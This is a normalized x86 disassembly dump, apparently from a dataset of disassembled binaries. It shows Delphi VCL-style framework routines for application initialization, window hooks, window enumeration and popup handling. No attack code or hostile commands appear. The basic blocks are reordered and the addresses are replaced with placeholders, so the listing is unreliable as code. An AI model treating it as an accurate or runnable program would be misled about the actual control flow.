mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_480088
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_47f6a0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
movzx eax [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4246e8
movzx edx [ ebp - 0x1 ]
call sub_47fecc
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_47f68c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x283 ] 0x1
je r-xdata
cmp [ ebx + 0x283 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_424590
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_424768
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4246e8
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax ebx
call sub_47fe44
test al al
je r-xdata
inc esi
sub_4801d8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_47f6a0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_47f68c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x283 ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_480230
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_4801d8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4802aa
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_480088
pop ecx
push ebp
mov al 0x2
call sub_480088
pop ecx
push ebp
mov al 0x3
call sub_480088
pop ecx
push ebp
mov al 0x4
call sub_480088
pop ecx
push ebp
mov al 0x5
call sub_480088
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_4802b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47fe14
xor eax eax
push ebp
push sub_480331
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoW
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_480230
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8a ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_47fe1c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8a ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_480354
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
xor edx edx
call sub_449d2c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_449d2c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_4803ac
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_4803dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_48338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_480400
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_48c3c8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_483438
sub_48045c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_481fe8
sub_4804a0
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa9 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax [ rw-data ]
push eax
push 0x3
call SetWindowsHookExW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_480514
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_480570
push ebx
add esp 0xfffffff8
mov ebx 0x8
mov [ esp ] ebx
push 0x0
lea eax [ esp + 0x4 ]
push eax
push ebx
push 0x48
call SystemParametersInfoW
test eax eax
je r-xdata
xor eax eax
cmp [ esp + 0x4 ] 0x0
setne al
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_4805a0
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x49
call SystemParametersInfoW
pop ecx
pop edx
retn
sub_4805cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_480570
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_4805a0
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_4805a0
sub_48060c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_47f8ac
pop edi
pop esi
pop ebx
retn
sub_48063c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x58 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x58 ]
mov edx esi
call sub_4246e8
call sub_4481b0
inc esi
dec ebx
jne r-xdata
sub_480698
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47f654
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_47f640
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_47f640
call sub_47f344
test al al
je r-xdata
sub_4806e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push ebp
call sub_480698
pop ecx
test eax eax
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_480674
push ebp
call sub_480698
pop ecx
sub_480728
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
push 0x0
call OleInitialize
test eax 0x80000000
sete al
mov [ ebx + 0x17c ] al
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_482674
mov [ ebx + 0x31 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d3c0
mov esi eax
mov [ ebx + 0x38 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_482d18
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x8c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0xac ] eax
xor eax eax
mov [ ebx + 0x5c ] eax
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x58 ] 0xff000018
mov [ ebx + 0x74 ] 0x1f4
mov [ ebx + 0x78 ] 0x1
xor eax eax
mov [ ebx + 0x7c ] eax
mov [ ebx + 0x70 ] 0x9c4
mov [ ebx + 0x84 ] 0x0
mov [ ebx + 0xa1 ] 0x1
mov [ ebx + 0xb8 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_472fb4
mov esi eax
mov [ ebx + 0x9c ] esi
push sub_48097c
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconW
mov edx eax
mov eax esi
call sub_4733b8
mov eax [ ebx + 0x9c ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_482fc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x94 ] eax
push 0x100
lea eax [ ebp - 0x202 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameW
lea eax [ ebp - 0x202 ]
mov dx 0x5c
call sub_4362f0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_482884
lea eax [ ebp - 0x202 ]
mov dx 0x2e
call sub_4362d8
test eax eax
je r-xdata
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x202 ]
call sub_4360f0
lea eax [ ebp - 0x202 ]
push eax
call CharNextW
push eax
call CharLowerW
lea eax [ ebx + 0x88 ]
lea edx [ ebp - 0x202 ]
mov ecx 0x100
call sub_449f14
push ebx
push sub_482088
call sub_476e74
mov [ ebx + 0x178 ] eax
mov [ ebx + 0xcc ] 0x0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x55 ] 0x1
mov [ ebx + 0x56 ] 0x1
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0xa2 ] 0x1
mov [ ebx + 0xcd ] 0x0
mov [ ebx + 0xd8 ] 0x0
xor eax eax
mov [ ebx + 0xd0 ] eax
mov [ ebx + 0xcf ] 0x0
xor eax eax
mov [ ebx + 0xa4 ] eax
mov eax ebx
call sub_4831f0
mov eax ebx
call sub_483db4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_480af0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_48097c
dec ebp
add [ ecx ] al
dec ecx
add [ esi ] cl
dec ecx
add [ ebx ] al
dec edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_483dc4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_482674
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_482884
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa4 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0xa1 ] 0x0
mov eax esi
call sub_483438
xor edx edx
mov eax esi
call sub_482cc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
mov eax [ esi + 0x178 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
push esi
push sub_4811f4
mov eax esi
call sub_4822d4
mov eax [ esi + 0x170 ]
test eax eax
je r-xdata
call sub_476e88
cmp [ esi + 0x48 ] 0x0
je r-xdata
cmp [ esi + 0xa8 ] 0x0
je r-xdata
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
lea eax [ esi + 0x48 ]
call sub_44b8d8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xac ]
call sub_4481b0
mov eax [ esi + 0x8c ]
call sub_4481b0
mov eax [ esi + 0x94 ]
call sub_4481b0
mov eax [ esi + 0x9c ]
call sub_4481b0
lea eax [ esi + 0x38 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
cmp [ esi + 0x17c ] 0x0
je r-xdata
call sub_476e6c
mov eax [ esi + 0x170 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageW
test bl bl
jle r-xdata
call OleUninitialize
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_480af0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480ca1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480ca8
lea eax [ ebp - 0x2c ]
call j_sub_449348
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_481380
call sub_476e58
mov [ ebx + 0x174 ] eax
mov eax DefWindowProcW
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoW
test eax eax
jne r-xdata
push 0x84ca0000
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassW
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x88 ]
call sub_449db8
mov ecx eax
mov edx [ rw-data ]
mov eax 0x80
call sub_41d3e0
mov [ ebx + 0x170 ] eax
mov [ ebx + 0xa8 ] 0x1
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x170 ]
push eax
call SetWindowLongW
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_481ac0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x170 ]
push eax
call SendMessageW
mov eax ebx
call sub_481ac0
push eax
push 0xfffffff2
mov eax [ ebx + 0x170 ]
push eax
call SetClassLongW
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_480cb0
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x40 ]
jne r-xdata
cmp edx [ eax + 0x44 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x40 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x5c ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x5c ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x70 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x60 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
cmp edx [ eax + 0x5c ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x70 ] esi
mov eax [ ecx ]
call sub_47f6a8
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x5c ] edx
sub_480d10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x170 ]
jne r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_424590
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x40 ]
test [ edi + 0x1c ] 0x8
jne r-xdata
mov eax edi
call sub_496868
cmp ebx eax
je r-xdata
sub_480d98
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
inc [ ebx + 0x90 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_480d10
call EnumWindows
mov eax [ ebx + 0x8c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongW
test al 0x8
je r-xdata
mov eax [ ebx + 0x8c ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x8c ]
call sub_4246e8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_480ea8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0xc8 ]
call sub_44af30
mov edx eax
test edx edx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ ebx + 0xc8 ]
xor ecx ecx
mov [ edx + esi * 4 + 0x4 ] ecx
mov eax [ ebx + 0xc8 ]
mov [ eax + esi * 4 ] 0xffffffff
jmp r-xdata
lea esi [ eax + eax * 2 ]
mov ecx [ ebx + 0xc8 ]
cmp edi [ ecx + esi * 4 + 0x4 ]
jne r-xdata
sub_480ef8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x170 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x90 ] 0x0
jle r-xdata
dec [ ebx + 0x90 ]
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8c ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x8c ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x8c ]
call sub_4246e8
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_480f64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
or edi 0xffffffff
push 0x4
push esi
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
mov edx ebx
call sub_424744
test eax eax
jge r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp esi [ eax + 0x170 ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x94 ]
mov edx ebx
call sub_424590
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
jne r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xd4 ]
call sub_44af28
inc eax
push eax
mov eax [ rw-data ]
add eax 0xd4
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ rw-data ]
mov eax [ eax + 0xd4 ]
call sub_44af28
mov edx [ rw-data ]
mov edx [ edx + 0xd4 ]
mov [ edx + eax * 4 - 0x4 ] esi
sub_481058
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
cmp [ esi + 0x98 ] 0x0
jle r-xdata
cmp [ esi + 0x98 ] 0x0
jne r-xdata
dec [ esi + 0x98 ]
cmp [ esi + 0x98 ] 0x0
jne r-xdata
inc [ esi + 0x98 ]
jmp r-xdata
mov eax esi
call sub_483c04
push eax
push sub_480f64
call EnumWindows
cmp [ esi + 0x40 ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov eax [ esi + 0x94 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ esi + 0x94 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x94 ]
call sub_4246e8
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0xd4 ]
call sub_44af30
mov edi eax
cmp edi 0x0
jl r-xdata
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x0
lea eax [ esi + 0xd4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x94 ]
call sub_4246e8
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0xd4 ]
call sub_44af30
mov edi eax
cmp edi 0x0
jl r-xdata
push 0x0
mov eax [ esi + 0xd4 ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
push 0x5
mov eax [ esi + 0xd4 ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_4811f4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ edi + 0x55 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ edi + 0x56 ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_43b25c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_47fc8c
mov eax [ rw-data ]
call sub_480340
cmp [ edi + 0xcf ] 0x0
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ edi + 0x170 ]
call sub_476a30
mov cl 0x1
xor edx edx
mov eax [ edi + 0x170 ]
call sub_476a30
sub_481274
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4812e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x16a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4812ea
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax [ esi + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_449ed8
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
sub_4812f0
push ebp
mov ebp esp
